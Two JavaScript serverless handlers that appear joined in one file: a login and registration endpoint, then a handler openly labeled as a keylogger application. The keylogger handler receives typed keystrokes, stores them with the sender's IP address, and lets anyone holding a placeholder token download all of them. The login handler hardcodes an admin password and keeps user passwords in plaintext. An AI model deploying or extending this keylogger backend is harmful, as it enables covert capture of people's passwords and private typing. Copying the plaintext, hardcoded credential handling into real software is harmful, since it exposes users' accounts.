// Temporary memory to store users
const users = [
    { username: 'admin', password: 'securePassword123' }
];

// CHANGED: Using module.exports instead of export default for Vercel compatibility
module.exports = function(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }
    
    const { action, username, password } = req.body;

    // --- LOGIN LOGIC ---
    if (action === 'login') {
        const foundUser = users.find(u => u.username === username && u.password === password);
        
        if (foundUser) {
            return res.status(200).json({ 
                success: true, 
                message: 'Login successful' 
            });
        } else {
            return res.status(401).json({ 
                success: false, 
                message: 'Access Denied. Invalid credentials.' 
            });
        }
    }
    
    // --- REGISTRATION LOGIC ---
    if (action === 'register') {
        if (password.length >= 6) {
            const userExists = users.find(u => u.username === username);
            if (userExists) {
                return res.status(400).json({ 
                    success: false, 
                    message: 'Registration Failed: Username is already taken!' 
                });
            }

            users.push({ username: username, password: password });
            return res.status(200).json({ 
                success: true, 
                message: 'Account created successfully! You can now switch to Log In.' 
            });
        } else {
            return res.status(400).json({ 
                success: false, 
                message: 'Registration Failed: Password must be at least 6 characters.' 
            });
        }
    }

    return res.status(400).json({ success: false, message: 'Invalid action requested.' });
};
// KEYLOGGER APPLICATION 
// api/log.js
let keystrokes = [];

export default function handler(req, res) {
  if (req.method === 'POST') {
    const { keys, timestamp, tag } = req.body;
    keystrokes.push({ timestamp, tag, keys, ip: req.headers['x-forwarded-for'] });
    console.log(`[LOG] ${tag}: ${keys}`);
    return res.status(200).json({ ok: true, total: keystrokes.length });
  }

  if (req.method === 'GET') {
    // DANGER: Anyone can read. Protect with a secret query param in production.
    const secret = req.query.secret;
    if (secret !== 'your-secret-token') {
      return res.status(403).json({ error: 'forbidden' });
    }
    return res.status(200).json({ count: keystrokes.length, logs: keystrokes });
  }

  return res.status(405).json({ error: 'method not allowed' });
}
